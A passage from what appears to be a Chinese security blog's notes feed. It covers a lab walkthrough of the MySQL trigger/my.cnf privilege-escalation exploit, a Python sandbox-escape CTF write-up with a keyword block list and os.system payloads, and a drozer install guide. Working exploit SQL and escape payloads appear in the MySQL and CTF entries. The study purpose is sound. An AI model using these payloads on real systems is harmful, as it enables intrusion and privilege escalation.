available.</span><br><span class="line">Distributor ID:Ubuntu</span><br><span class="line">Description:Ubuntu 14.04.5 LTS</span><br><span class="line">Release:14.04</span><br><span class="line">Codename:trusty</span><br></pre></td></tr></table></figure></p><p>注意这里有一步是waiting for reverse connect shell…，需要一点时间，成功后有root权限的shell</p>]]></content>
      
      
      <categories>
          
          <category> notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cve </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MYSQL提权分析</title>
      <link href="2016/09/18/old-old-cve-2016-6663-mysql-exp/"/>
      <url>2016/09/18/old-old-cve-2016-6663-mysql-exp/</url>
      
        <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>几天前出了mysql本地提权的0day，虽然现在官方已经出了补丁，但是受影响的主机还是挺多的。跟进操作一遍：）</p><a id="more"></a><h1 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">MySQL  &lt;= 5.7.15       远程代码执行/ 提权 (0day)</span><br><span class="line">        5.6.33</span><br><span class="line">        5.5.52</span><br><span class="line"></span><br><span class="line">Mysql分支的版本也受影响,包括：</span><br><span class="line">    MariaDB</span><br><span class="line">    PerconaDB</span><br></pre></td></tr></table></figure><h1 id="实验分析"><a href="#实验分析" class="headerlink" title="实验分析"></a>实验分析</h1><p>这次实验主要使用docker搭建环境，有需要的同学可以pull我的库玩<a href="https://hub.docker.com/r/0kami/vulevn/tags/" target="_blank" rel="noopener">0kami/vulenv:cve-2016-6663</a><br>实验主要从attacker的角度入手，预先拥有的权限：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql 账户拥有file权限 bob/bob</span><br><span class="line">exp mysql_hookandroot_lib.c</span><br><span class="line">mysql-server-5.6</span><br><span class="line">my.cnf可被mysql组改写写</span><br></pre></td></tr></table></figure></p><p>先查看一下版本信息<br><img src="../../../../img/cve-2016-6662/pic1.png" alt><br>将<code>/etc/mysql/my.cnf</code>权限修改掉<br><img src="../../../../img/cve-2016-6662/pic2.png" alt><br>创建bob用户，并赋予file，select，insert权限，创建用于实验的数据库activedb和表active_table<br><img src="../../../../img/cve-2016-6662/pic3.png" alt><br><img src="../../../../img/cve-2016-6662/pic4.png" alt><br>将exp先写入tmp目录，并编译成so文件，需要修改一下ip，port和my.cnf的位置<br><img src="../../../../img/cve-2016-6662/pic5.png" alt><br><code>gcc -Wall -fPIC -shared -o mysql_hookandroot_lib.c.so mysql_hookandroot_lib.c.c -ldl</code><br><img src="../../../../img/cve-2016-6662/pic6.png" alt><br>最后一步就是准备一下active_table的触发器了，我们可以现在自己电脑上root用户权限下生成一个tragger<br><img src="../../../../img/cve-2016-6662/pic7.png" alt><br>在activedb数据下会生成一个触发器<br><img src="../../../../img/cve-2016-6662/pic8.png" alt><br>到此位置我们所有的准备工作都做好了。让我们用bob用户来弹个shell吧<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &quot;TYPE=TRIGGERS\ntriggers=&apos;CREATE DEFINER=`root`@`localhost` TRIGGER active_table\nAFTER INSERT\n   ON `active_table` FOR EACH ROW\nBEGIN\n   DECLARE void varchar(550);\n   set global general_log_file=\\\&apos;/etc/mysql/my.cnf\\\&apos;;\n   set global general_log = on;\n   select \&quot;\n[mysqld]\nmalloc_lib=\\\&apos;/tmp/mysql_hookandroot_lib.so\\\&apos;\n\&quot; INTO void;   \n   set global general_log = off;\nEND&apos;\nsql_modes=1073741824\ndefiners=&apos;root@localhost&apos;\nclient_cs_names=&apos;latin1&apos;\nconnection_cl_names=&apos;latin1_swedish_ci&apos;\ndb_cl_names=&apos;latin1_swedish_ci&apos;&quot; into dumpfile &apos;/var/lib/mysql/activedb/active_table.TRG&apos;;</span><br></pre></td></tr></table></figure></p><p>用bob的用户写入文件产生一个触发器，这个触发器当产生insert时触发<br><img src="../../../../img/cve-2016-6662/pic9.png" alt><br>来查看一下，执行后的<code>/etc/mysql/my.cnf</code>的内容<br><img src="../../../../img/cve-2016-6662/pic10.png" alt><br>重启一下数据库，反弹一个shell<br>发现可写的my.cnf会被忽略？？？不知道为什么（难道打补丁了？），不知道5.5的情况会怎么样，所以先把my.cnf的权限改回来744<br><img src="../../../../img/cve-2016-6662/pic11.png" alt><br><img src="../../../../img/cve-2016-6662/pic12.png" alt><br>成功反弹一个shell，这边返回的一个shell是mysql权限的 是因为我测试的环境mysqld_safe是以mysql权限运行的，所以弹出来的权限是mysql的，但是如果mysqld_safe是以root权限运行，那么反弹的shell就是root权限的，造成提权。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>测试环境搭建还有利用过程还是出现了很多问题，可写的my.cnf会被忽略载入（不知道是不是因为修复过的原因），triggers的利用（可以同样利用在拥有file权限的情况下提升权限，这个到时候再深入学习一下）</p>]]></content>
      
      
      <categories>
          
          <category> notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cve </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python sandbox escape</title>
      <link href="2016/09/16/old-old-python-sandbox-escape/"/>
      <url>2016/09/16/old-old-python-sandbox-escape/</url>
      
        <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>前几天的华山杯出了一道python的沙盒逃逸，感觉挺有意思的。在网上搜索了一下，发现很早就出过这种类型的题，源码都差不多。学习了一下思路，这里总结一下：）</p><a id="more"></a><h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>沙盒源码如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"></span><br><span class="line">print(<span class="string">"Welcome to my Python sandbox! Enter commands below!"</span>)</span><br><span class="line"></span><br><span class="line">banned = [  </span><br><span class="line">    <span class="string">"import"</span>,</span><br><span class="line">    <span class="string">"exec"</span>,</span><br><span class="line">    <span class="string">"eval"</span>,</span><br><span class="line">    <span class="string">"pickle"</span>,</span><br><span class="line">    <span class="string">"os"</span>,</span><br><span class="line">    <span class="string">"subprocess"</span>,</span><br><span class="line">    <span class="string">"kevin sucks"</span>,</span><br><span class="line">    <span class="string">"input"</span>,</span><br><span class="line">    <span class="string">"banned"</span>,</span><br><span class="line">    <span class="string">"cry sum more"</span>,</span><br><span class="line">    <span class="string">"sys"</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">targets = __builtins__.__dict__.keys()  </span><br><span class="line">targets.remove(<span class="string">'raw_input'</span>)  </span><br><span class="line">targets.remove(<span class="string">'print'</span>)  </span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> targets:<span class="comment"># 去除所有内置函数除print raw_input</span></span><br><span class="line">    <span class="keyword">del</span> __builtins__.__dict__[x]</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:  </span><br><span class="line">    print(<span class="string">"&gt;&gt;&gt;"</span>, end=<span class="string">' '</span>)</span><br><span class="line">    data = raw_input()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> no <span class="keyword">in</span> banned:</span><br><span class="line">        <span class="keyword">if</span> no.lower() <span class="keyword">in</span> data.lower():</span><br><span class="line">            print(<span class="string">"No bueno"</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>: <span class="comment"># this means nobreak</span></span><br><span class="line">        <span class="keyword">exec</span> data</span><br></pre></td></tr></table></figure></p><p>不能出现banned列表中的字符，但是需要读取flag文件内容。</p><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>绕过前面的限制，我们来一步一步看payload</p><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; [].__class__</span><br><span class="line">&lt;type &apos;list&apos;&gt;</span><br><span class="line">&gt;&gt;&gt; &#123;&#125;.__class__</span><br><span class="line">&lt;type &apos;dict&apos;&gt;</span><br><span class="line">&gt;&gt;&gt; ().__class__</span><br><span class="line">&lt;type &apos;tuple&apos;&gt;</span><br></pre></td></tr></table></figure><p>首先python的内置对象有一个<strong>class</strong>属性来存储类型，我们往上找他的父类使用<strong>base</strong>属性<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &#123;&#125;.__class__.__base__</span><br><span class="line">&lt;type &apos;object&apos;&gt;</span><br><span class="line">&gt;&gt;&gt; ().__class__.__base__</span><br><span class="line">&lt;type &apos;object&apos;&gt;</span><br><span class="line">&gt;&gt;&gt; [].__class__.__base__</span><br><span class="line">&lt;type &apos;object&apos;&gt;</span><br></pre></td></tr></table></figure></p><p>可以看到返回object对象，因为python中一切均为对象，均继承object对象，得到object之后我们就可在通过属性<strong>subclasses</strong>来查看object的子类（包括所有的内置类）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; [].__class__.__base__.__subclasses__()</span><br><span class="line">[&lt;type &apos;type&apos;&gt;, &lt;type &apos;weakref&apos;&gt;, &lt;type &apos;weakcallableproxy&apos;&gt;, &lt;type &apos;weakproxy&apos;&gt;, &lt;type &apos;int&apos;&gt;, &lt;type &apos;basestring&apos;&gt;, &lt;type &apos;bytearray&apos;&gt;, &lt;type &apos;list&apos;&gt;, &lt;type &apos;NoneType&apos;&gt;, &lt;type &apos;NotImplementedType&apos;&gt;, &lt;type &apos;traceback&apos;&gt;, &lt;type &apos;super&apos;&gt;, &lt;type &apos;xrange&apos;&gt;, &lt;type &apos;dict&apos;&gt;, &lt;type &apos;set&apos;&gt;, &lt;type &apos;slice&apos;&gt;, &lt;type &apos;staticmethod&apos;&gt;, &lt;type &apos;complex&apos;&gt;, &lt;type &apos;float&apos;&gt;, &lt;type &apos;buffer&apos;&gt;, &lt;type &apos;long&apos;&gt;, &lt;type &apos;frozenset&apos;&gt;, &lt;type &apos;property&apos;&gt;, &lt;type &apos;memoryview&apos;&gt;, &lt;type &apos;tuple&apos;&gt;, &lt;type &apos;enumerate&apos;&gt;, &lt;type &apos;reversed&apos;&gt;, &lt;type &apos;code&apos;&gt;, &lt;type &apos;frame&apos;&gt;, &lt;type &apos;builtin_function_or_method&apos;&gt;, &lt;type &apos;instancemethod&apos;&gt;, &lt;type &apos;function&apos;&gt;, &lt;type &apos;classobj&apos;&gt;, &lt;type &apos;dictproxy&apos;&gt;, &lt;type &apos;generator&apos;&gt;, &lt;type &apos;getset_descriptor&apos;&gt;, &lt;type &apos;wrapper_descriptor&apos;&gt;, &lt;type &apos;instance&apos;&gt;, &lt;type &apos;ellipsis&apos;&gt;, &lt;type &apos;member_descriptor&apos;&gt;, &lt;type &apos;file&apos;&gt;, &lt;type &apos;PyCapsule&apos;&gt;, &lt;type &apos;cell&apos;&gt;, &lt;type &apos;callable-iterator&apos;&gt;, &lt;type &apos;iterator&apos;&gt;, &lt;type &apos;sys.long_info&apos;&gt;, &lt;type &apos;sys.float_info&apos;&gt;, &lt;type &apos;EncodingMap&apos;&gt;, &lt;type &apos;fieldnameiterator&apos;&gt;, &lt;type &apos;formatteriterator&apos;&gt;, &lt;type &apos;sys.version_info&apos;&gt;, &lt;type &apos;sys.flags&apos;&gt;, &lt;type &apos;exceptions.BaseException&apos;&gt;, &lt;type &apos;module&apos;&gt;, &lt;type &apos;imp.NullImporter&apos;&gt;, &lt;type &apos;zipimport.zipimporter&apos;&gt;, &lt;type &apos;posix.stat_result&apos;&gt;, &lt;type &apos;posix.statvfs_result&apos;&gt;, &lt;class &apos;warnings.WarningMessage&apos;&gt;, &lt;class &apos;warnings.catch_warnings&apos;&gt;, &lt;class &apos;_weakrefset._IterationGuard&apos;&gt;, &lt;class &apos;_weakrefset.WeakSet&apos;&gt;, &lt;class &apos;_abcoll.Hashable&apos;&gt;, &lt;type &apos;classmethod&apos;&gt;, &lt;class &apos;_abcoll.Iterable&apos;&gt;, &lt;class &apos;_abcoll.Sized&apos;&gt;, &lt;class &apos;_abcoll.Container&apos;&gt;, &lt;class &apos;_abcoll.Callable&apos;&gt;, &lt;type &apos;dict_keys&apos;&gt;, &lt;type &apos;dict_items&apos;&gt;, &lt;type &apos;dict_values&apos;&gt;, &lt;class &apos;site._Printer&apos;&gt;, &lt;class &apos;site._Helper&apos;&gt;, &lt;type &apos;_sre.SRE_Pattern&apos;&gt;, &lt;type &apos;_sre.SRE_Match&apos;&gt;, &lt;type &apos;_sre.SRE_Scanner&apos;&gt;, &lt;class &apos;site.Quitter&apos;&gt;, &lt;class &apos;codecs.IncrementalEncoder&apos;&gt;, &lt;class &apos;codecs.IncrementalDecoder&apos;&gt;]</span><br></pre></td></tr></table></figure></p><p>回到我们的主要目的上，我们需要读取flag文件中的内容，在这些子类中有哪些是可以用来读取文件内容的呢？答案是file子类，首先查找一下file子类的位置。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; [].__class__.__base__.__subclasses__().index(file)</span><br><span class="line">40</span><br></pre></td></tr></table></figure></p><p>这样我们就可以通过这个来建立一个file类的别名读文件啦：）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; f=[].__class__.__base__.__subclasses__()[40]</span><br><span class="line">&gt;&gt;&gt; f(&apos;./flag.txt&apos;).read()</span><br></pre></td></tr></table></figure></p><p>？？？没有任何内容打印出来，但是他没有报错说明存在flag.txt文件，我们尝试用他给的print函数来打印<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; print(f(&apos;./flag.txt&apos;).read())</span><br><span class="line">This is a Flag&#123;enjoy_yourself_ctfer&#125;</span><br></pre></td></tr></table></figure></p><p>得到flag</p><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>同样的还有一种方法就是使用os模块来执行系统命令system，但是os被屏蔽<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import os</span><br><span class="line">No bueno</span><br></pre></td></tr></table></figure></p><p>我们得想其他办法来获取shell。通过上面的思路，我们需要找一个子类他能调用os模块，这里用到了<code>warnings.catch_warnings</code>类<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import warnings</span><br><span class="line">&gt;&gt;&gt; [].__class__.__base__.__subclasses__().index(warnings.catch_warnings)</span><br><span class="line">59</span><br><span class="line">&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59]</span><br><span class="line">&lt;class &apos;warnings.catch_warnings&apos;&gt;</span><br><span class="line">&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.func_globals.keys()</span><br><span class="line">[&apos;filterwarnings&apos;, &apos;once_registry&apos;, &apos;WarningMessage&apos;, &apos;_show_warning&apos;, &apos;filters&apos;, &apos;_setoption&apos;, &apos;showwarning&apos;, &apos;__all__&apos;, &apos;onceregistry&apos;, &apos;__package__&apos;, &apos;simplefilter&apos;, &apos;default_action&apos;, &apos;_getcategory&apos;, &apos;__builtins__&apos;, &apos;catch_warnings&apos;, &apos;__file__&apos;, &apos;warnpy3k&apos;, &apos;sys&apos;, &apos;__name__&apos;, &apos;warn_explicit&apos;, &apos;types&apos;, &apos;warn&apos;, &apos;_processoptions&apos;, &apos;defaultaction&apos;, &apos;__doc__&apos;, &apos;linecache&apos;, &apos;_OptionError&apos;, &apos;resetwarnings&apos;, &apos;formatwarning&apos;, &apos;_getaction&apos;]</span><br></pre></td></tr></table></figure></p><p>接下来再找<code>linecache</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.func_globals.keys().index(&apos;linecache&apos;)</span><br><span class="line">25</span><br><span class="line">&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].__dict__.keys()</span><br><span class="line">[&apos;updatecache&apos;, &apos;clearcache&apos;, &apos;__all__&apos;, &apos;__builtins__&apos;, &apos;__file__&apos;, &apos;cache&apos;, &apos;checkcache&apos;, &apos;getline&apos;, &apos;__package__&apos;, &apos;sys&apos;, &apos;getlines&apos;, &apos;__name__&apos;, &apos;os&apos;, &apos;__doc__&apos;]</span><br></pre></td></tr></table></figure></p><p>可以看到这里可以调用os模块，接下来就调用system函数了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].__dict__.values()[12]</span><br><span class="line">&lt;module &apos;os&apos; from &apos;/usr/lib/python2.7/os.pyc&apos;&gt;</span><br><span class="line">&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].__dict__.values()[12].__dict__.keys().index(&apos;system&apos;)</span><br><span class="line">144</span><br></pre></td></tr></table></figure></p><p>整理一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; a=[].__class__.__base__.__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].__dict__.values()[12]</span><br><span class="line">&gt;&gt;&gt; a</span><br><span class="line">&lt;module &apos;os&apos; from &apos;/usr/lib/python2.7/os.pyc&apos;&gt;</span><br><span class="line">&gt;&gt;&gt; s=a.__dict__.keys().index(&apos;system&apos;)</span><br><span class="line">&gt;&gt;&gt; s</span><br><span class="line">144</span><br><span class="line">&gt;&gt;&gt; s=a.__dict__.keys()[144]</span><br><span class="line">&gt;&gt;&gt; s</span><br><span class="line">&apos;system&apos;</span><br><span class="line">&gt;&gt;&gt; s=a.__dict__.values()[144]</span><br><span class="line">&gt;&gt;&gt; s(&apos;pwd&apos;)</span><br><span class="line">/home/xxxx/Desktop/code/python-code/test</span><br></pre></td></tr></table></figure></p><p>好了现在可以执行系统命令了，cat一下flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s(&apos;cat flag.txt&apos;)</span><br><span class="line">This is a Flag&#123;enjoy_yourself_ctfer&#125;</span><br></pre></td></tr></table></figure></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>通过上面的python沙盒逃逸，发现读python官网手册还是很有必要的，找个时间一点一点看：）共勉</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://hexplo.it/escaping-the-csawctf-python-sandbox/" target="_blank" rel="noopener">https://hexplo.it/escaping-the-csawctf-python-sandbox/</a></p>]]></content>
      
      
      <categories>
          
          <category> notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vul </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>how to install drozer on mac</title>
      <link href="2016/08/20/old-old-how-to-install-drozer-on-mac/"/>
      <url>2016/08/20/old-old-how-to-install-drozer-on-mac/</url>
      
        <content type="html"><![CDATA[<h1 id="一：概述"><a href="#一：概述" class="headerlink" title="一：概述"></a>一：概述</h1><p>drozer是一款针对Android系统的安全测试框架。drozer可以帮助Android app和设备变得更安全，其提供了很多Android平台下的渗透测试exploit供你使用和分享。对于远程的exploit，它可以生成shellcode帮助你进行远程设备管理。</p><ol><li>更快的Android安全评估<br>drozer可以大大缩减Android安全评估的耗时，通过攻击测试暴露Android APP的漏洞。</li><li>基于真机的测试<br>drozer运行在Android模拟器和真实设备上，它只需要USB调试即可使用。</li><li>自动化和扩展<br>drozer有很多扩展模块，你可以找到他们进行测试以发现Android安全问题。</li></ol><a id="more"></a><h1 id="二：安装"><a href="#二：安装" class="headerlink" title="二：安装"></a>二：安装</h1><p>drozer下载链接：<a href="https://github.com/mwrlabs/drozer" target="_blank" rel="noopener">https://github.com/mwrlabs/drozer</a></p><blockquote><p>window和Linux下的安装要简单的多，但是在mac上安装时遇到了一些错误，因此将自己的安装步骤记录下来。</p></blockquote><p>因为是用python写的，所以Mac可以下载python.egg文件进行安装。但是想通过<code>easy_install</code>安装，必须拥有以下这些模块：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">cffi==1.1.2</span><br><span class="line">cryptography==0.9.3</span><br><span class="line">drozer==2.3.4</span><br><span class="line">enum34==1.0.4</span><br><span class="line">idna==2.0</span><br><span class="line">ipaddress==1.0.14</span><br><span class="line">protobuf==2.4.1</span><br><span class="line">pyasn1==0.1.8</span><br><span class="line">pycparser==2.14</span><br><span class="line">pyOpenSSL==0.13</span><br><span class="line">six==1.9.0</span><br><span class="line">Twisted==10.2.0</span><br></pre></td></tr></table></figure><p>而安装过程中主要的错误是由pyOpenSSL造成的。</p><h3 id="1-1-安装openssl"><a href="#1-1-安装openssl" class="headerlink" title="1.1 安装openssl"></a>1.1 安装openssl</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ brew uninstall openssl #if installed already</span><br><span class="line">$ brew install openssl</span><br></pre></td></tr></table></figure><h3 id="1-2-编译pyOpenSSL"><a href="#1-2-编译pyOpenSSL" class="headerlink" title="1.2 编译pyOpenSSL"></a>1.2 编译pyOpenSSL</h3><p>不幸的是在后面安装Python.egg还是会报错,原因是Drozer需要特殊版本的openssl，我们需要下载 pyOpenSSL v0.13，然后用<code>sed</code>指令修复typo，具体指令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ wget https://pypi.python.org/packages/source/p/pyOpenSSL/pyOpenSSL-0.13.tar.gz</span><br><span class="line">$ tar xzvf pyOpenSSL-0.13.tar.gz</span><br><span class="line">$ cd pyOpenSSL-0.13</span><br><span class="line">$ sed -i &apos;&apos; &apos;s/X509_REVOKED_dup/X509_REVOKED_dupe/&apos; OpenSSL/crypto/crl.c</span><br></pre></td></tr></table></figure></p><p>接下来我们build OpenSSL，这里需要指明本机中OpenSSL headers文件的位置：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ python setup.py build_ext -L/usr/local/opt/openssl/lib -I/usr/local/opt/openssl/include</span><br><span class="line">$ python setup.py build</span><br><span class="line">$ python setup.py install</span><br></pre></td></tr></table></figure></p><h3 id="1-3-安装其他支撑文件"><a href="#1-3-安装其他支撑文件" class="headerlink" title="1.3 安装其他支撑文件"></a>1.3 安装其他支撑文件</h3><p>终于进入安装说明文档中的步骤了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo easy_install --allow-hosts pypi.python.org protobuf==2.4.1</span><br><span class="line">$ sudo easy_install twisted==10.2.0 #ignore any warnings/errors, it works</span><br></pre></td></tr></table></figure></p><h3 id="1-4-安装drozer"><a href="#1-4-安装drozer" class="headerlink" title="1.4 安装drozer"></a>1.4 安装drozer</h3><p>最后一步，install drozer<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo easy_install ./drozer-2.3.4-py2.7.egg</span><br></pre></td></tr></table></figure></p><h3 id="1-5-runnning"><a href="#1-5-runnning" class="headerlink" title="1.5 runnning"></a>1.5 runnning</h3><p>此时可以在任何目录下使用drozer 命令啦！</p><h1 id="三：Drozer入门—-获取App-Package信息"><a href="#三：Drozer入门—-获取App-Package信息" class="headerlink" title="三：Drozer入门— 获取App Package信息"></a>三：Drozer入门— 获取App Package信息</h1><p><strong><em>此处以<a href="https://www.mwrinfosecurity.com/system/assets/380/original/sieve.apk" target="_blank" rel="noopener">sieve.apk</a>为例</em></strong></p><p>drozer每个模块的作用：</p><p><img src="http://blog.0kami.cn/img/drozer/imag1.png" alt></p><p>获取App包信息的模块是 <em>**</em> app.package.* :</p><h3 id="2-1-获取获取Android设备上的所有的安装的App的包名"><a href="#2-1-获取获取Android设备上的所有的安装的App的包名" class="headerlink" title="2.1 获取获取Android设备上的所有的安装的App的包名"></a>2.1 获取获取Android设备上的所有的安装的App的包名</h3><p>命令是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.package.info -a com.mwr.example.sieve run app.package.list</span><br></pre></td></tr></table></figure></p><p>这条命令会把所有的App都列出来，如果想具体查找某个App可加上-f [App关键字]的参数，如查找sieve在Android设备中的包名：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.package.list -f sieve</span><br></pre></td></tr></table></figure></p><h3 id="2-2-获取Sieve的一些基本信息"><a href="#2-2-获取Sieve的一些基本信息" class="headerlink" title="2.2 获取Sieve的一些基本信息"></a>2.2 获取Sieve的一些基本信息</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.package.info -a com.mwr.example.sieve</span><br></pre></td></tr></table></figure><p><img src="http://blog.0kami.cn/img/drozer/imag2.png" alt></p><h3 id="2-3-Itentify-The-Attack-Surface-确定攻击面"><a href="#2-3-Itentify-The-Attack-Surface-确定攻击面" class="headerlink" title="2.3 Itentify The Attack Surface(确定攻击面)"></a>2.3 Itentify The Attack Surface(确定攻击面)</h3><p>这个测试教程主要关注的是Android 固有的IPC通信机制的脆弱性，这些特点导致了App泄漏敏感信息给同一台设备上的其它App。 查找可以进行Attack Surface的组件的命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.package.attacksurface com.mwr.example.sieve</span><br></pre></td></tr></table></figure></p><p><img src="http://blog.0kami.cn/img/drozer/imag3.png" alt><br>结果显示了潜在可以利用的组件个数： “exported”表示组件可以被其他App使用。 services is debuggable表示我们可以用adb绑定一个调试器到进程。</p><h3 id="2-4-进一步获取Attack-Surface的信息"><a href="#2-4-进一步获取Attack-Surface的信息" class="headerlink" title="2.4 进一步获取Attack Surface的信息"></a>2.4 进一步获取Attack Surface的信息</h3><p>如进一步获取ativity组建的attack surface信息的命令是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.activity.info -a com.mwr.example.sieve</span><br></pre></td></tr></table></figure></p><p><img src="http://blog.0kami.cn/img/drozer/imag4.png" alt></p><h3 id="2-5-启动Activities"><a href="#2-5-启动Activities" class="headerlink" title="2.5 启动Activities"></a>2.5 